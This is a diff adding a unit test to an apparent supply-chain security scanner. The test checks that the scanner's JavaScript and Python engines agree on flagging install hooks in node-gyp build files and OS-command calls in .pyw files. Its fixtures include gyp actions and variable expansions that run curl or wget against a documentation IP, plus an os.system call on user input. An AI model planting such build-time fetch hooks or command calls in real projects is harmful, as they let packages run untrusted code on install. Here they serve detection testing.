@@ -62,6 +62,30 @@ class CoreParityTests(unittest.TestCase):
                 self.assertNotIn(PEM_BODY, json.dumps(report), engine)
             self.assertIn("X-CMD", {i["rule"] for i in py[1]["issues"]})
 
+    def test_gyp_includes_and_pyw_sources(self):
+        files = {
+            "binding.gyp": "{\n  'includes': ['build/common.gypi'],\n  'targets': [{'target_name': 'addon'}]\n}\n",
+            "build/common.gypi": ("{\n  'target_defaults': {\n    'actions': [{\n      'action_name': 'marker',\n"
+                                  "      'action': ['sh', '-c', 'curl http://192.0.2.1/marker.txt -o out.txt'],\n"
+                                  "    }],\n  },\n}\n"),
+            "tools/gen.gyp": "{'variables': {'x': '<!(curl -s http://192.0.2.1/v)'}}\n",
+            "deps/UPPER.GYPI": "{'targets': [{'actions': [{'action': ['python', 'gen.py']}]}]}\n",
+            "broken.gypi": "{'targets': [",
+            "tool.pyw": "import os\nos.system(user_cmd)  # marker\n",
+            "node_modules/native/binding.gyp": "{'targets': [{'actions': [{'action': ['node', 'x.js']}]}]}\n",
+            "node_modules/native/common.gypi": "{'variables': {'y': '<!(wget http://192.0.2.1/y)'}}\n",
+        }
+        with tree(files) as root:
+            for deps in (False, True):
+                js, py = parity.both(root, deps=deps, extra=("--ci",))
+                with self.subTest(deps=deps):
+                    self.assert_same(js, py, label=f"gyp/pyw deps={deps}")
+                    found = {(i["rule"], i["file"].replace("\\", "/")) for i in py[1]["issues"]}
+                    self.assertIn(("SC-INSTALL-HOOK", "build/common.gypi"), found)
+                    self.assertIn(("S-OSCMD-PY", "tool.pyw"), found)
+                    self.assertEqual(deps, ("SC-INSTALL-HOOK", "node_modules/native/common.gypi") in found)
+                    self.assertEqual((js[0], py[0]), (1, 1))
+
 
 if __name__ == "__main__":
     unittest.main()
